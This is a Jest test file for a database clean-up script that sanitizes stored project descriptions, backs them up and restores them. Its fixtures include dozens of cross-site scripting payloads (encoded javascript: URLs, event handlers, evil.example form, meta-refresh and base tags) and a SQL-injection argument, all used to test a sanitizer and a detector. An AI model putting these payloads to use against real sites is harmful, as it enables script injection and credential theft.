import {
  afterAll,
  afterEach,
  beforeAll,
  beforeEach,
  describe,
  expect,
  jest,
  test,
} from "@jest/globals";
import fs from "fs";
import os from "os";
import path from "path";
import { DataSource, EntityManager } from "typeorm";
import { closeConnection, deleteAll, getTestEntityManager } from "./utils";
import { Project } from "../model";
import {
  BackupEntry,
  descriptionFormatOf,
  isSuspicious,
  main,
  parseArgs,
  planRow,
  readBackup,
  runCleanup,
  runRestore,
} from "../scripts/sanitizeProjectDescriptions";
import * as sanitizer from "../features/import-projects/sanitizeDescription";
import * as db from "../helpers/db";

const DIRTY_HTML =
  '<p>About <strong>us</strong></p><img src=x onerror="alert(1)"><script>alert(1)</script>';
const CLEAN_HTML = "<p>About <strong>us</strong></p>";
const MARKDOWN = "About **us** <img src=x onerror=alert(1)>";

let em: EntityManager;
let dir: string;
let backupFile: string;
const quiet = () => {};

const seed = (id: string, source: string, values: Partial<Project>) =>
  em.getRepository(Project).save(
    new Project({
      id,
      source,
      projectId: id,
      title: id,
      totalVouches: 0,
      totalFlags: 0,
      totalAttests: 0,
      imported: true,
      lastUpdatedTimestamp: new Date("2026-01-01T00:00:00.000Z"),
      ...values,
    })
  );

const snapshot = async () =>
  (await em.getRepository(Project).find({ order: { id: "ASC" } })).map(
    ({ id, description, descriptionHtml, descriptionSummary }) => ({
      id,
      description,
      descriptionHtml,
      descriptionSummary,
    })
  );

const backupEntries = (): BackupEntry[] =>
  fs
    .readFileSync(backupFile, "utf8")
    .split("\n")
    .filter(Boolean)
    .map((line) => JSON.parse(line));

beforeAll(async () => {
  em = await getTestEntityManager();
});
afterAll(async () => {
  await closeConnection();
});
beforeEach(async () => {
  await deleteAll(em, Project);
  dir = fs.mkdtempSync(path.join(os.tmpdir(), "devouch-cleanup-"));
  backupFile = path.join(dir, "backup.jsonl");

  // Stored by the old importer: raw converter output next to the markdown.
  await seed("gitcoin-1", "gitcoin", {
    description: MARKDOWN,
    descriptionHtml: DIRTY_HTML,
    descriptionSummary: "About us alert(1)",
  });
  // Giveth keeps its HTML in `description`.
  await seed("giveth-1", "giveth", {
    description: DIRTY_HTML,
    descriptionSummary: "About us alert(1)",
  });
  // Plain text that only looks like markup.
  await seed("rf-1", "rf", {
    description: "a < b <script>alert(1)</script>",
    descriptionSummary: "a < b",
  });
  // Already clean, and a row created by an attestation with no description.
  await seed("gitcoin-2", "gitcoin", {
    description: "plain",
    descriptionHtml: "<p>plain</p>",
    descriptionSummary: "plain",
  });
  await seed("unknown-1", "unknown", {});
});

describe("planRow", () => {
  test("uses the importer's format for each source", () => {
    expect(descriptionFormatOf("giveth")).toBe("html");
    for (const source of ["gitcoin", "gardens", "rf", "rpgf3", "other"]) {
      expect(descriptionFormatOf(source)).toBe("text");
    }
  });

  test("returns null for a row that is already clean", () => {
    expect(
      planRow({
        id: "x",
        source: "gitcoin",
        description: MARKDOWN,
        descriptionHtml: CLEAN_HTML,
        descriptionSummary: "s",
      })
    ).toBeNull();
  });
});

describe("clean-up of stored descriptions", () => {
  test("a dry run reports the rows and writes nothing", async () => {
    const before = await snapshot();
    const lines: string[] = [];
    const report = await runCleanup(em.connection, {
      apply: false,
      log: (line) => lines.push(line),
    });

    expect(report).toMatchObject({
      scanned: 4,
      needingChange: 2,
      suspicious: 2,
      updated: 0,
      bySource: { gitcoin: 1, giveth: 1 },
    });
    expect(
      lines.filter((line) => line.startsWith("WOULD UPDATE"))
    ).toHaveLength(2);
    expect(await snapshot()).toEqual(before);
    expect(fs.existsSync(backupFile)).toBe(false);
  });

  test("applying refuses to run without a backup file", async () => {
    await expect(
      runCleanup(em.connection, { apply: true, log: quiet })
    ).rejects.toThrow(/backup/);
  });

  test("applying sanitizes HTML, leaves text alone and records the old values", async () => {
    const before = await snapshot();
    const report = await runCleanup(em.connection, {
      apply: true,
      backupFile,
      batchSize: 1,
      log: quiet,
    });
    expect(report).toMatchObject({
      needingChange: 2,
      updated: 2,
      skippedConcurrent: 0,
    });

    const after = await snapshot();
    const row = (id: string) => after.find((p) => p.id === id)!;
    expect(row("gitcoin-1")).toEqual({
      id: "gitcoin-1",
      description: MARKDOWN,
      descriptionHtml: CLEAN_HTML,
      descriptionSummary: "About us",
    });
    expect(row("giveth-1")).toMatchObject({
      description: CLEAN_HTML,
      descriptionHtml: null,
      descriptionSummary: "About us",
    });
    // Untouched rows are byte-for-byte what they were.
    for (const id of ["rf-1", "gitcoin-2", "unknown-1"]) {
      expect(row(id)).toEqual(before.find((p) => p.id === id));
    }

    const backup = backupEntries();
    expect(backup.map((entry) => entry.id).sort()).toEqual([
      "gitcoin-1",
      "giveth-1",
    ]);
    expect(
      backup.find((entry) => entry.id === "gitcoin-1")!.before.descriptionHtml
    ).toBe(DIRTY_HTML);
  });

  test("a second run finds nothing to change", async () => {
    await runCleanup(em.connection, { apply: true, backupFile, log: quiet });
    const afterFirst = await snapshot();

    const second = await runCleanup(em.connection, {
      apply: true,
      backupFile: path.join(dir, "second.jsonl"),
      log: quiet,
    });
    expect(second).toMatchObject({ needingChange: 0, updated: 0 });
    expect(await snapshot()).toEqual(afterFirst);
    expect(fs.existsSync(path.join(dir, "second.jsonl"))).toBe(false);
  });

  test("--source limits the run to one source", async () => {
    const report = await runCleanup(em.connection, {
      apply: true,
      backupFile,
      source: "giveth",
      log: quiet,
    });
    expect(report).toMatchObject({ scanned: 1, updated: 1 });
    const gitcoin = (await snapshot()).find((p) => p.id === "gitcoin-1")!;
    expect(gitcoin.descriptionHtml).toBe(DIRTY_HTML);
  });

  test("restore puts the recorded values back", async () => {
    const before = await snapshot();
    await runCleanup(em.connection, { apply: true, backupFile, log: quiet });

    // Dry run first: nothing changes.
    const cleaned = await snapshot();
    expect(
      await runRestore(em.connection, {
        file: backupFile,
        apply: false,
        log: quiet,
      })
    ).toEqual({ entries: 2, restored: 0, alreadyRestored: 0, skipped: 0 });
    expect(await snapshot()).toEqual(cleaned);

    expect(
      await runRestore(em.connection, {
        file: backupFile,
        apply: true,
        log: quiet,
      })
    ).toEqual({ entries: 2, restored: 2, alreadyRestored: 0, skipped: 0 });
    expect(await snapshot()).toEqual(before);
  });

  test("restore does not overwrite a row imported since the clean-up", async () => {
    await runCleanup(em.connection, { apply: true, backupFile, log: quiet });
    await em
      .getRepository(Project)
      .update({ id: "gitcoin-1" }, { descriptionHtml: "<p>newer</p>" });

    expect(
      await runRestore(em.connection, {
        file: backupFile,
        apply: true,
        log: quiet,
      })
    ).toEqual({ entries: 2, restored: 1, alreadyRestored: 0, skipped: 1 });
    const gitcoin = (await snapshot()).find((p) => p.id === "gitcoin-1")!;
    expect(gitcoin.descriptionHtml).toBe("<p>newer</p>");
  });
});

// What the script does when something goes wrong half-way. The database is
// reached through a wrapper that lets a test act just before a batch is
// written, or make that write fail.
describe("interrupted and concurrent runs", () => {
  const beforeEachBatch = (
    hook: (batch: number) => Promise<void> | void
  ): DataSource => {
    let batch = 0;
    return new Proxy(em.connection, {
      get(target, property) {
        if (property === "transaction") {
          return async (work: any) => {
            await hook(++batch);
            return target.transaction(work);
          };
        }
        const value = Reflect.get(target, property, target);
        return typeof value === "function" ? value.bind(target) : value;
      },
    });
  };
  const restoreAll = async (file: string) =>
    runRestore(em.connection, { file, apply: true, log: quiet });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  test("a row the importer rewrote in the meantime is left alone", async () => {
    const dataSource = beforeEachBatch(async () => {
      await em
        .getRepository(Project)
        .update({ id: "gitcoin-1" }, { descriptionHtml: "<p>newer</p>" });
    });
    const report = await runCleanup(dataSource, {
      apply: true,
      backupFile,
      source: "gitcoin",
      log: quiet,
    });
    expect(report).toMatchObject({ updated: 0, skippedConcurrent: 1 });
    const row = (id: string) =>
      snapshot().then((s) => s.find((p) => p.id === id)!);
    expect((await row("gitcoin-1")).descriptionHtml).toBe("<p>newer</p>");

    // ...and restoring the backup does not put the older value back over it.
    expect(await restoreAll(backupFile)).toMatchObject({
      restored: 0,
      skipped: 1,
    });
    expect((await row("gitcoin-1")).descriptionHtml).toBe("<p>newer</p>");
  });

  test("a failure in a later batch keeps earlier batches, and everything is recoverable", async () => {
    const before = await snapshot();
    const dataSource = beforeEachBatch((batch) => {
      if (batch === 2) throw new Error("connection lost");
    });
    await expect(
      runCleanup(dataSource, {
        apply: true,
        backupFile,
        batchSize: 1,
        log: quiet,
      })
    ).rejects.toThrow("connection lost");

    // Batches are ordered by id: gitcoin-1 was committed, giveth-1 was not.
    const interrupted = await snapshot();
    const row = (id: string) => interrupted.find((p) => p.id === id)!;
    expect(row("gitcoin-1").descriptionHtml).toBe(CLEAN_HTML);
    expect(row("giveth-1").description).toBe(DIRTY_HTML);
    // The backup was written before each write was attempted, so it covers
    // the committed row (and the one that was about to be written).
    expect(backupEntries().map((entry) => entry.id)).toEqual([
      "gitcoin-1",
      "giveth-1",
    ]);

    // Running again finishes the job, into a second backup file.
    const secondBackup = path.join(dir, "second.jsonl");
    const rerun = await runCleanup(em.connection, {
      apply: true,
      backupFile: secondBackup,
      log: quiet,
    });
    expect(rerun).toMatchObject({ needingChange: 1, updated: 1 });

    // Both files together bring every row back to where it started.
    await restoreAll(secondBackup);
    await restoreAll(backupFile);
    expect(await snapshot()).toEqual(before);
  });

  test("a failure inside a batch rolls the whole batch back", async () => {
    const before = await snapshot();
    const original = em.connection.transaction.bind(em.connection);
    jest
      .spyOn(em.connection, "transaction")
      .mockImplementation(async (work: any) =>
        original(async (manager: EntityManager) => {
          await work(manager);
          throw new Error("commit failed");
        })
      );
    await expect(
      runCleanup(em.connection, { apply: true, backupFile, log: quiet })
    ).rejects.toThrow("commit failed");
    jest.restoreAllMocks();

    expect(await snapshot()).toEqual(before);
    // Nothing was changed, so restoring the backup has nothing to do.
    expect(await restoreAll(backupFile)).toMatchObject({
      restored: 0,
      alreadyRestored: 2,
      skipped: 0,
    });
    expect(await snapshot()).toEqual(before);
  });

  test("a row that cannot be sanitized is reported and the rest still run", async () => {
    const real = sanitizer.sanitizeDescriptionFields;
    jest
      .spyOn(sanitizer, "sanitizeDescriptionFields")
      .mockImplementation((fields, format) => {
        if (fields.descriptionHtml === DIRTY_HTML) throw new Error("boom");
        return real(fields, format);
      });
    const lines: string[] = [];
    const report = await runCleanup(em.connection, {
      apply: true,
      backupFile,
      log: (line) => lines.push(line),
    });
    expect(report).toMatchObject({ failed: 1, updated: 1 });
    expect(lines).toContain("FAILED gitcoin-1: boom");
    const rows = await snapshot();
    expect(rows.find((p) => p.id === "gitcoin-1")!.descriptionHtml).toBe(
      DIRTY_HTML
    );
    expect(rows.find((p) => p.id === "giveth-1")!.description).toBe(CLEAN_HTML);
  });

  test("restoring twice reports the rows as already restored", async () => {
    const before = await snapshot();
    await runCleanup(em.connection, { apply: true, backupFile, log: quiet });
    await restoreAll(backupFile);
    expect(await restoreAll(backupFile)).toEqual({
      entries: 2,
      restored: 0,
      alreadyRestored: 2,
      skipped: 0,
    });
    expect(await snapshot()).toEqual(before);
  });
});

describe("backup files", () => {
  test("a last line cut short by an interrupted run is ignored", async () => {
    const before = await snapshot();
    await runCleanup(em.connection, { apply: true, backupFile, log: quiet });
    fs.appendFileSync(
      backupFile,
      '{"id":"giveth-9","source":"giveth","before":{"descr'
    );

    const lines: string[] = [];
    const report = await runRestore(em.connection, {
      file: backupFile,
      apply: true,
      log: (line) => lines.push(line),
    });
    expect(report).toMatchObject({ entries: 2, restored: 2 });
    expect(lines.some((line) => line.startsWith("WARNING"))).toBe(true);
    expect(await snapshot()).toEqual(before);
  });

  test("a file with a damaged entry in the middle is refused before any write", async () => {
    await runCleanup(em.connection, { apply: true, backupFile, log: quiet });
    const cleaned = await snapshot();
    const [first, second] = fs
      .readFileSync(backupFile, "utf8")
      .split("\n")
      .filter(Boolean);
    fs.writeFileSync(backupFile, `${first}\nnot json\n${second}\n`);

    await expect(
      runRestore(em.connection, { file: backupFile, apply: true, log: quiet })
    ).rejects.toThrow(/line 2 is not a backup entry/);
    expect(await snapshot()).toEqual(cleaned);
  });

  test("an entry without the recorded values is refused", async () => {
    fs.writeFileSync(
      backupFile,
      '{"id":"gitcoin-1","before":{"description":"x"}}\n{"id":"x"}\n'
    );
    await expect(readBackup(backupFile, quiet)).rejects.toThrow(
      /not a backup entry/
    );
  });

  // Line and paragraph separators occur in real descriptions and must not be
  // taken for the end of a backup line.
  test("descriptions containing line separators survive a round trip", async () => {
    const odd = `<p onclick="x">a\u2028b\u2029c\r\nd</p>`;
    await em
      .getRepository(Project)
      .update({ id: "gitcoin-1" }, { descriptionHtml: odd });
    const before = await snapshot();
    await runCleanup(em.connection, { apply: true, backupFile, log: quiet });
    expect(
      (await readBackup(backupFile, quiet)).find(
        (entry) => entry.id === "gitcoin-1"
      )!.before.descriptionHtml
    ).toBe(odd);
    await runRestore(em.connection, {
      file: backupFile,
      apply: true,
      log: quiet,
    });
    expect(await snapshot()).toEqual(before);
  });
});

describe("isSuspicious", () => {
  const video =
    '<iframe class="ql-video" src="https://www.youtube.com/embed/dQw4w9WgXcQ"></iframe>';

  test("an ordinary video embed is not flagged", () => {
    expect(isSuspicious(`<p>x</p>${video}`, `<p>x</p>${video}`)).toBe(false);
    expect(isSuspicious("<p>x</p><iframe></iframe>", "<p>x</p>")).toBe(false);
  });

  test("an iframe that the clean-up removed is flagged", () => {
    expect(
      isSuspicious(
        `${video}<iframe src="https://evil.example"></iframe>`,
        video
      )
    ).toBe(true);
  });

  test("scripts, handlers and script URLs are flagged", () => {
    for (const html of [
      "<script>x</script>",
      "<p onclick=x>y</p>",
      '<a href="javascript:x">y</a>',
      "<svg></svg>",
    ]) {
      expect(isSuspicious(html, "")).toBe(true);
    }
  });
});

// The label is there to make stored payloads stand out in a report of
// thousands of rows, so it must not fire on what people ordinarily write.
describe("isSuspicious: ordinary descriptions", () => {
  test.each([
    "<p>We focus on = equality, see javascript: docs</p>",
    "<p>Our motto: carry on = never stop. Data:text/html is a MIME type.</p>",
    "<p>Vote on=chain, then onboard = done</p>",
    "<p>Use the &lt;script&gt; tag and the onclick= attribute carefully</p>",
    "<p>Read our style guide, fill in the form, follow the link, base camp</p>",
    '<a href="https://example.com/?next=javascript:void">docs</a>',
    '<a href="https://example.com/onboarding?on=1" title="carry on = go">x</a>',
    '<img src="https://example.com/a.png" alt="a > b on = c">',
    '<p style="color: red; text-align: center">styled</p>',
    '<a href="mailto:team@example.com">mail</a><a href="tel:+123">call</a>',
    "a < b and c > d, ones = twos",
    "<linker>not a link element</linker><forms>x</forms>",
  ])("%j is not flagged", (html) => {
    // Sanitizing still changes some of these; that alone is not suspicious.
    expect(isSuspicious(html, sanitizer.sanitizeDescriptionHtml(html))).toBe(
      false
    );
  });
});

describe("isSuspicious: attack-like markup", () => {
  test.each([
    "<script>alert(1)</script>",
    "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
    "<script/src=x>",
    '<img src=x onerror="alert(1)">',
    "<img src=x onerror=alert(1)>",
    "<p onclick = x>y</p>",
    '<img alt="a>b" onerror=alert(1) src=x>',
    '<div/onmouseover="x">y</div>',
    '<a href="javascript:alert(1)">y</a>',
    '<a href="  JaVaScRiPt:alert(1)">y</a>',
    '<a href="java\tscript:alert(1)">y</a>',
    '<a href="&#106;avascript:alert(1)">y</a>',
    '<a href="&#x6A;&#x61;vascript&colon;alert(1)">y</a>',
    '<a href="vbscript:msgbox(1)">y</a>',
    '<a href="data:text/html;base64,PHNjcmlwdD4=">y</a>',
    '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>',
    '<p style="background: url(javascript:alert(1))">y</p>',
    "<svg onload=alert(1)></svg>",
    "<svg><a xlink:href='javascript:alert(1)'>y</a></svg>",
    "<math><mi>x</mi></math>",
    "<object data=x></object>",
    "<embed src=x>",
    "<style>p{color:red}</style>",
    '<form action="https://evil.example"><input name=p></form>',
    '<meta http-equiv="refresh" content="0;url=https://evil.example">',
    '<link rel="stylesheet" href="https://evil.example/x.css">',
    '<base href="https://evil.example/">',
    // Never closed, so a parser reports no tag - still an attempt.
    "<p>text</p><img src=x onerror=alert(1)",
    '<p>text</p><a href="javascript:alert(1)',
    "<p>text</p><script",
  ])("%j is flagged", (html) => {
    expect(isSuspicious(html, sanitizer.sanitizeDescriptionHtml(html))).toBe(
      true
    );
  });

  test("the report counts payloads, not prose that mentions them", async () => {
    await deleteAll(em, Project);
    await seed("giveth-prose", "giveth", {
      description:
        "<p>We focus on = equality&nbsp;and javascript: tutorials</p>",
    });
    await seed("giveth-payload", "giveth", {
      description: "<p>Hello</p><img src=x onerror=alert(1)>",
    });
    const report = await runCleanup(em.connection, {
      apply: false,
      log: quiet,
    });
    expect(report).toMatchObject({ needingChange: 2, suspicious: 1 });
  });
});

describe("--source", () => {
  test.each(["giveth", "gitcoin", "gardens", "rf", "rpgf3"])(
    "%s is accepted",
    (source) => {
      expect(parseArgs([`--source=${source}`]).source).toBe(source);
    }
  );

  test.each([
    ["an unknown source", "--source=givth"],
    ["an empty source", "--source="],
    ["a source with no value", "--source"],
    ["different casing", "--source=Giveth"],
    ["surrounding spaces", "--source= giveth "],
    ["a list", "--source=giveth,gitcoin"],
    ["a row id", "--source=giveth-1"],
    ["a pattern", "--source=%"],
    ["an injection attempt", "--source=giveth' OR '1'='1"],
    ["a source that only attestations create", "--source=unknown"],
  ])("%s is refused", (_name, arg) => {
    expect(() => parseArgs([arg])).toThrow(/source/i);
  });

  test("other malformed arguments are refused", () => {
    expect(() => parseArgs(["--apply=true"])).toThrow("--apply takes no value");
    expect(() => parseArgs(["--apply=false"])).toThrow(
      "--apply takes no value"
    );
    expect(() => parseArgs(["--source=giveth", "--source=rf"])).toThrow(
      "given twice"
    );
    expect(() => parseArgs(["--sorce=giveth"])).toThrow("Unknown argument");
    expect(parseArgs(["--apply", "--source=rf"])).toMatchObject({
      apply: true,
      source: "rf",
    });
  });

  test("an invalid source fails the command before it connects", async () => {
    const connect = jest.spyOn(db, "getDataSource");
    const print = jest.spyOn(console, "log").mockImplementation(() => {});
    for (const arg of ["--source=givth", "--source=", "--source"]) {
      await expect(main([arg, "--apply"])).rejects.toThrow(/source/i);
    }
    expect(connect).not.toHaveBeenCalled();
    // No summary line: nothing may read as a completed, clean run.
    expect(print).not.toHaveBeenCalled();
    connect.mockRestore();
    print.mockRestore();
  });

  test("runCleanup refuses an unknown source instead of scanning nothing", async () => {
    await expect(
      runCleanup(em.connection, { apply: false, source: "givth", log: quiet })
    ).rejects.toThrow('Unknown source "givth"');
    await expect(
      runCleanup(em.connection, { apply: false, source: "", log: quiet })
    ).rejects.toThrow("Unknown source");
  });
});
